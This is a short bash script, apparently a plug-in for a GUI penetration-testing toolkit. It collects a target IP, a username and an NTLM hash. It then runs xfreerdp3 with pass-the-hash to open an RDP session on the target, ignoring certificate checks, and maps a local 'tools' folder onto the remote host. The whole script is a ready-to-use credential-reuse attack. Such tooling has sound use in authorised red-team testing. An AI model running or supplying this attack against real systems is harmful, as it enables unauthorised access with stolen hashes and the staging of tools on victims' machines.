#!/bin/bash

: '
xfreerdp: Connect with pass the hash, map drive 'tools' to current directory (check `net use` for the location).
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
IP_FIELD=$(form_item  "IP address" "ip")
USERNAME_FIELD=$(form_item  "Username" "username")
HASH_FIELD=$(form_item  "hash" "hash")
DRIVE_NAME_FIELD=$(form_item  "drive name" "drive_name" "tools")
DRIVE_DIR_FIELD=$(form_item  "drive dir" "drive_dir" "./tools")

# Generate GUI form
generate_form "${IP_FIELD}" "${USERNAME_FIELD}" "${HASH_FIELD}" "${DRIVE_NAME_FIELD}" "${DRIVE_DIR_FIELD}"

IP=${form_data["ip"]}
USERNAME=${form_data["username"]}
HASH=${form_data["hash"]}
DRIVE_NAME=${form_data["drive_name"]}
DRIVE_DIR=${form_data["drive_dir"]}

execute_command "xfreerdp3 /u:'${USERNAME}' /pth:'${HASH}' /v:${IP} /cert:ignore /smart-sizing /size:1920x1080 /drive:${DRIVE_NAME},\"${DRIVE_DIR}\""
create_new_line
